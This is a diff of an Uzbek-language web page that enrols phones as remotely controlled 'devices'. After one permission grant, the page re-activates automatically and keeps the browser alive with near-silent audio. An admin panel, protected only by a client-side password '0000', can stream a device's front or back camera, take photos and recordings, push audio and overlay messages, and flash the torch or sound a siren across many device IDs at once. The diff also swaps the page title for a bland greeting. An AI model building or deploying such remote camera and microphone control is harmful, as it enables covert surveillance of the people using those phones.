@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>👋🏿 HELLO</title>
+    <title id="siteTitle">Huş Kelibsiz</title>
     <style>
         :root {
             --bg-color: #0f172a;
@@ -19,7 +19,7 @@
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
         body { background-color: var(--bg-color); color: var(--text); padding: 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        .box { max-width: 700px; width: 100%; background: var(--card-bg); padding: 20px; border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
+        .box { max-width: 750px; width: 100%; background: var(--card-bg); padding: 20px; border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
         h2 { color: var(--accent); font-size: 1.1rem; margin-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 6px; }
         .badge { background: rgba(59,130,246,0.2); border: 1px solid var(--accent); padding: 10px; border-radius: 6px; text-align: center; font-weight: bold; margin-bottom: 10px; }
         
@@ -33,10 +33,11 @@
         .btn-teal { background: var(--teal); }
         .btn-blue { background: var(--accent); width: 100%; }
 
-        textarea, input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px; margin-bottom: 10px; }
+        textarea, input, select { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 6px; margin-bottom: 10px; }
         textarea { height: 60px; resize: none; }
         
         .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 8px; }
+        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 8px; }
         .card { background: #0f172a; border: 1px solid #334155; padding: 12px; border-radius: 8px; margin-bottom: 12px; }
         .video-box { width: 100%; height: 220px; background: #000; border-radius: 6px; overflow: hidden; margin-top: 8px; display: none; }
         .video-box img { width: 100%; height: 100%; object-fit: cover; }
@@ -46,15 +47,46 @@
         .media-item img, .media-item video { width: 100%; height: 75px; object-fit: cover; border-radius: 4px; }
         .media-actions { display: flex; gap: 4px; margin-top: 4px; }
         .media-actions a, .media-actions button { flex: 1; font-size: 0.65rem; padding: 4px; text-align: center; text-decoration: none; border: none; border-radius: 3px; cursor: pointer; color: white; }
+
+        /* Ekranga chiqadigan xabar paneli */
+        #screenMessageOverlay {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: rgba(15, 23, 42, 0.95);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px;
+            text-align: center;
+        }
+        #screenMessageText {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 20px;
+            word-break: break-all;
+        }
+        #messageTimerCount {
+            font-size: 1.2rem;
+            color: #f59e0b;
+        }
     </style>
 </head>
 <body>
+
+    <!-- EKRANGA CHIQADIGAN XABAR OYNASI -->
+    <div id="screenMessageOverlay">
+        <div id="screenMessageText"></div>
+        <div id="messageTimerCount">Qolgan vaqt: <span id="timerSec">0</span>s</div>
+    </div>
 
     <!-- 1. QURILMA REJIMI -->
     <div class="box">
         <h2>Ushbu Qurilma Paneli</h2>
         <div class="badge">ID: <span id="myId">Yuklanmoqda...</span></div>
-        <button class="btn-blue" onclick="initDevice()">Tizimni Fon Rejimida Ishga Tushirish</button>
+        <button class="btn-blue" onclick="initDevice()">Tizimni Faollashtirish</button>
         <p id="statusText" style="font-size:0.8rem; color:#94a3b8; text-align:center; margin-top:6px;"></p>
         
         <video id="deviceVid" autoplay playsinline muted style="display:none;"></video>
@@ -64,7 +96,7 @@
         <div class="media-list" id="deviceGallery"></div>
     </div>
 
-    <!-- 2. ADMIN KIRISH -->
+    <!-- 2. ADMIN KIRISH (Har safar sahifa yangilanganda yopiladi) -->
     <div class="box" id="loginBox">
         <h2>Admin Rejimi (Parol: 0000)</h2>
         <input type="password" id="passInput" placeholder="Parolni kiriting (0000)">
@@ -73,16 +105,29 @@
 
     <!-- 3. ADMIN BOSHQARUV -->
     <div class="box" id="adminBox" style="display:none;">
-        <h2>Boshqaruv Paneli</h2>
-        <textarea id="targetIds" placeholder="ID larni kiriting (masalan: DEV-1234)"></textarea>
+        <h2>Markaziy Boshqaruv Paneli</h2>
+        <textarea id="targetIds" placeholder="ID larni vergul bilan kiriting (masalan: DEV-1234, DEV-5678)"></textarea>
+
+        <!-- Ommaviy Xabar Yuborish va Taymer -->
+        <div style="background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; margin-bottom: 10px;">
+            <b style="font-size: 0.85rem; color: var(--warning);">Ekranga Xabar Yuborish (Taymer):</b>
+            <input type="text" id="bulkMsgText" placeholder="Xabar matnini kiriting..." style="margin-top:6px;">
+            <div class="grid-3">
+                <input type="number" id="msgHour" placeholder="Soat" value="0" min="0">
+                <input type="number" id="msgMin" placeholder="Minut" value="0" min="0">
+                <input type="number" id="msgSec" placeholder="Sekund" value="10" min="1">
+            </div>
+            <button class="btn-yellow" onclick="sendBulkMessage()">Xabarni Hamma ID larga Yuborish</button>
+        </div>
 
         <div class="grid">
-            <button class="btn-green" onclick="sendCmd('ON')">Yoqish</button>
-            <button class="btn-red" onclick="sendCmd('OFF')">Oʻchirish</button>
+            <button class="btn-green" onclick="sendCmd('ON')">Barchasini Yoqish</button>
+            <button class="btn-red" onclick="sendCmd('OFF')">Barchasini Oʻchirish</button>
             <button class="btn-yellow" onclick="sendCmd('BLINK')">Miltillatish</button>
         </div>
-        <button class="btn-red" onclick="sendCmd('SIREN')" style="width:100%; margin-bottom:8px;">🚨 Sirena Yoqish</button>
-        <button class="btn-blue" onclick="loadAdminCards()">Kartalarni Yuklash</button>
+        <button class="btn-red" onclick="sendCmd('SIREN')" style="width:100%; margin-bottom:8px;">🚨 Hammasiga Sirena Yoqish</button>
+        
+        <button class="btn-blue" onclick="loadAdminCards()">Kiritilgan ID larning Kartalarini ochish</button>
 
         <div id="cardsContainer" style="margin-top: 15px;"></div>
     </div>
@@ -112,6 +157,10 @@
         }
         document.getElementById("myId").innerText = deviceId;
 
+        // Har bir ID uchun dinamik sayt nomi
+        document.title = "Boshqaruv - [" + deviceId + "]";
+        document.getElementById("siteTitle").innerText = "Panel: " + deviceId;
+
         let activeStream = null;
         let videoTrack = null;
         let blinkTimer = null;
@@ -120,7 +169,6 @@
         let recChunks = [];
         let audioCtx = null;
         let sirenOsc = null;
-        let silentAudioNode = null;
 
         window.onload = () => {
             if(localStorage.getItem("granted") === "true") initDevice();
@@ -129,47 +177,75 @@
 
         async function initDevice() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' }, 
-                    audio: true 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
                 videoTrack = stream.getVideoTracks()[0];
-                
                 localStorage.setItem("granted", "true");
-                document.getElementById("statusText").innerText = "Tizim fon rejimida faol. Ishlayveradi!";
+                document.getElementById("statusText").innerText = "Tizim to'liq ishda va buyruqlarni kutmoqda.";
 
-                // Brauzer fonda uxlab qolmasligi uchun ovozsiz audio oqimini yoqamiz
                 startSilentKeepAlive();
 
-                db.ref('devices/' + deviceId + '/state').on('value', snap => {
-                    executeInstantState(snap.val() || "OFF");
-                });
-
+                // Chiroq va sirena buyruqlari
+                db.ref('devices/' + deviceId + '/state').on('value', snap => executeInstantState(snap.val() || "OFF"));
                 db.ref('devices/' + deviceId + '/streamSource').on('value', snap => setStreamSource(snap.val() || "NONE"));
                 db.ref('devices/' + deviceId + '/action').on('value', snap => handleAction(snap.val()));
-                
-                db.ref('devices/' + deviceId + '/audio').on('value', snap => {
-                    const audData = snap.val();
-                    if (audData) {
-                        const player = document.getElementById("audioPlayer");
-                        player.src = audData;
-                        player.play().catch(e => { player.style.display = "block"; });
+
+                // Ovozli xabar (Takrorlanmaslik uchun faqat yangi timestamp tekshiriladi)
+                db.ref('devices/' + deviceId + '/audioObj').on('value', snap => {
+                    const obj = snap.val();
+                    if (obj && obj.data && obj.time) {
+                        let lastPlayed = localStorage.getItem("last_played_audio_time") || 0;
+                        if (obj.time > lastPlayed) {
+                            localStorage.setItem("last_played_audio_time", obj.time);
+                            const player = document.getElementById("audioPlayer");
+                            player.src = obj.data;
+                            player.play().catch(e => { player.style.display = "block"; });
+                        }
                     }
                 });
+
+                // Ekranga xabar chiqarish va taymer
+                db.ref('devices/' + deviceId + '/screenMsg').on('value', snap => {
+                    const msgObj = snap.val();
+                    if (msgObj && msgObj.text && msgObj.duration) {
+                        showScreenMessage(msgObj.text, msgObj.duration);
+                    }
+                });
+
             } catch(e) {
-                alert("Kamera yoki mikrofon ruxsati berilmadi: " + e.message);
+                alert("Ruxsat berilmadi: " + e.message);
             }
         }
 
-        // Brauzer fonda ishlashni to'xtatib qo'ymasligi uchun "Keep-Alive" texnologiyasi
+        // Ekranda ko'rsatish va taymer bo'yicha yopish
+        let messageTimer = null;
+        function showScreenMessage(text, totalSeconds) {
+            const overlay = document.getElementById("screenMessageOverlay");
+            const textEl = document.getElementById("screenMessageText");
+            const timerEl = document.getElementById("timerSec");
+
+            textEl.innerText = text;
+            overlay.style.display = "flex";
+
+            let sec = totalSeconds;
+            timerEl.innerText = sec;
+
+            clearInterval(messageTimer);
+            messageTimer = setInterval(() => {
+                sec--;
+                timerEl.innerText = sec;
+                if (sec <= 0) {
+                    clearInterval(messageTimer);
+                    overlay.style.display = "none";
+                }
+            }, 1000);
+        }
+
         function startSilentKeepAlive() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const buffer = audioCtx.createBuffer(1, audioCtx.sampleRate * 2, audioCtx.sampleRate);
                 const channelData = buffer.getChannelData(0);
-                for (let i = 0; i < buffer.length; i++) {
-                    channelData[i] = Math.random() * 0.000002; // Juda past shovqin (eshitilmaydi)
-                }
+                for (let i = 0; i < buffer.length; i++) channelData[i] = Math.random() * 0.000002;
                 const source = audioCtx.createBufferSource();
                 source.buffer = buffer;
                 source.loop = true;
@@ -181,32 +257,18 @@
         function executeInstantState(state) {
             clearInterval(blinkTimer);
             stopSirenSound();
-
             if (!videoTrack) return;
-
             try {
                 const caps = videoTrack.getCapabilities();
                 if (!caps.torch) return;
-
-                if (state === "ON") {
-                    videoTrack.applyConstraints({ advanced: [{ torch: true }] });
-                } 
-                else if (state === "OFF") {
-                    videoTrack.applyConstraints({ advanced: [{ torch: false }] });
-                } 
+                if (state === "ON") videoTrack.applyConstraints({ advanced: [{ torch: true }] });
+                else if (state === "OFF") videoTrack.applyConstraints({ advanced: [{ torch: false }] });
                 else if (state === "BLINK") {
                     let f = false;
-                    blinkTimer = setInterval(() => {
-                        f = !f;
-                        videoTrack.applyConstraints({ advanced: [{ torch: f }] });
-                    }, 150);
-                } 
-                else if (state === "SIREN") {
+                    blinkTimer = setInterval(() => { f = !f; videoTrack.applyConstraints({ advanced: [{ torch: f }] }); }, 150);
+                } else if (state === "SIREN") {
                     let f = false;
-                    blinkTimer = setInterval(() => {
-                        f = !f;
-                        videoTrack.applyConstraints({ advanced: [{ torch: f }] });
-                    }, 150);
+                    blinkTimer = setInterval(() => { f = !f; videoTrack.applyConstraints({ advanced: [{ torch: f }] }); }, 150);
                     startSirenSound();
                 }
             } catch(err) {}
@@ -216,19 +278,16 @@
             try {
                 if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 if (audioCtx.state === 'suspended') audioCtx.resume();
-                
                 sirenOsc = audioCtx.createOscillator();
                 const gainNode = audioCtx.createGain();
                 sirenOsc.type = 'sawtooth';
                 sirenOsc.frequency.setValueAtTime(500, audioCtx.currentTime);
-                
                 setInterval(() => {
                     if(sirenOsc && audioCtx) {
                         sirenOsc.frequency.setValueAtTime(800, audioCtx.currentTime);
                         setTimeout(() => { if(sirenOsc) sirenOsc.frequency.setValueAtTime(400, audioCtx.currentTime); }, 200);
                     }
                 }, 400);
-
                 sirenOsc.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
                 sirenOsc.start();
@@ -236,37 +295,27 @@
         }
 
         function stopSirenSound() {
-            if (sirenOsc) {
-                try { sirenOsc.stop(); sirenOsc.disconnect(); } catch(e){}
-                sirenOsc = null;
-            }
+            if (sirenOsc) { try { sirenOsc.stop(); sirenOsc.disconnect(); } catch(e){} sirenOsc = null; }
         }
 
         async function setStreamSource(source) {
             stopStream();
             if (source === "NONE") return;
-
             try {
                 if (source === "BACK") activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: true });
                 else if (source === "FRONT") activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-
                 if (activeStream) {
                     videoTrack = activeStream.getVideoTracks()[0];
                     const vid = document.getElementById("deviceVid");
                     vid.srcObject = activeStream;
                     startSendingFrames();
                 }
-            } catch(err) {
-                db.ref('devices/' + deviceId + '/streamSource').set("NONE");
-            }
+            } catch(err) { db.ref('devices/' + deviceId + '/streamSource').set("NONE"); }
         }
 
         function stopStream() {
             clearInterval(frameInterval);
-            if (activeStream) {
-                activeStream.getTracks().forEach(t => t.stop());
-                activeStream = null;
-            }
+            if (activeStream) { activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }
             db.ref('devices/' + deviceId + '/frame').remove();
         }
 
@@ -274,7 +323,6 @@
             const canvas = document.createElement("canvas");
             const ctx = canvas.getContext("2d");
             const vid = document.getElementById("deviceVid");
-
             frameInterval = setInterval(() => {
                 if (vid.videoWidth > 0) {
                     canvas.width = 300;
@@ -297,10 +345,8 @@
             const vid = document.getElementById("deviceVid");
             if (!vid.videoWidth) return;
             const canvas = document.createElement("canvas");
-            canvas.width = vid.videoWidth;
-            canvas.height = vid.videoHeight;
+            canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
             canvas.getContext("2d").drawImage(vid, 0, 0);
-            
             const data = canvas.toDataURL("image/png");
             saveMedia('photo', data);
         }
@@ -319,9 +365,7 @@
             mediaRecorder.start();
         }
 
-        function stopRecording() {
-            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
-        }
+        function stopRecording() { if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop(); }
 
         function saveMedia(type, data) {
             db.ref('devices/' + deviceId + '/media').push({ type, data });
@@ -362,17 +406,39 @@
             } else alert("Noto'g'ri parol!");
         }
 
+        // Barcha kiritilgan ID larga birvarakay buyruq berish
         function sendCmd(mode) {
             const ids = document.getElementById("targetIds").value.split(/[\n,]+/).map(i => i.trim()).filter(i => i);
+            if(!ids.length) return alert("Kamida bitta ID kiriting!");
             const updates = {};
             ids.forEach(id => updates['devices/' + id + '/state'] = mode);
             db.ref().update(updates);
+        }
+
+        // Ommaviy xabar va soat/minut/sekund taymerini yuborish
+        function sendBulkMessage() {
+            const ids = document.getElementById("targetIds").value.split(/[\n,]+/).map(i => i.trim()).filter(i => i);
+            const text = document.getElementById("bulkMsgText").value.trim();
+            if(!ids.length || !text) return alert("ID va xabar matnini kiriting!");
+
+            let h = parseInt(document.getElementById("msgHour").value) || 0;
+            let m = parseInt(document.getElementById("msgMin").value) || 0;
+            let s = parseInt(document.getElementById("msgSec").value) || 0;
+            let totalSec = (h * 3600) + (m * 60) + s;
+            if (totalSec <= 0) totalSec = 5;
+
+            const updates = {};
+            ids.forEach(id => {
+                updates['devices/' + id + '/screenMsg'] = { text: text, duration: totalSec, time: Date.now() };
+            });
+            db.ref().update(updates).then(() => alert("Xabar tanlangan barcha ID larga yuborildi!"));
         }
 
         function loadAdminCards() {
             const ids = document.getElementById("targetIds").value.split(/[\n,]+/).map(i => i.trim()).filter(i => i);
             const container = document.getElementById("cardsContainer");
             container.innerHTML = "";
+            if(!ids.length) return alert("ID larni kiriting!");
 
             ids.forEach(id => {
                 const card = document.createElement("div");
@@ -394,7 +460,7 @@
 
                     <div class="grid">
                         <button class="btn-teal" onclick="db.ref('devices/${id}/action').set('PHOTO')">📸 Rasm</button>
-                        <button class="btn-teal" onclick="db.ref('devics/${id}/action').set('START_REC')">🔴 Yozish</button>
+                        <button class="btn-teal" onclick="db.ref('devices/${id}/action').set('START_REC')">🔴 Yozish</button>
                         <button class="btn-red" onclick="db.ref('devices/${id}/action').set('STOP_REC')">⏹ Toʻxtatish</button>
                     </div>
 
@@ -412,7 +478,7 @@
                     else box.style.display = "none";
                 });
 
-                db.ref('devices/' + id + '/media').on('value,', snap => {
+                db.ref('devices/' + id + '/media').on('value', snap => {
                     const gallery = document.getElementById(`adminMedia-${id}`);
                     gallery.innerHTML = "";
                     if (snap.val()) {
@@ -442,16 +508,17 @@
                     const blob = new Blob(audioChunks, { type: 'audio/webm' });
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
-                    reader.onloadend = () => db.ref('devices/' + id + '/audio').set(reader.result);
+                    reader.onloadend = () => {
+                        // Ovozni timestamp bilan yuboramiz (qayta eshitilmasligi uchun)
+                        db.ref('devices/' + id + '/audioObj').set({ data: reader.result, time: Date.now() });
+                    };
                     stream.getTracks().forEach(t => t.stop());
                 };
                 audioRec.start();
             } catch(e) {}
         }
 
-        function stopSpeak(id) {
-            if (audioRec && audioRec.state !== "inactive") audioRec.stop();
-        }
+        function stopSpeak(id) { if (audioRec && audioRec.state !== "inactive") audioRec.stop(); }
     </script>
 </body>
 </html>
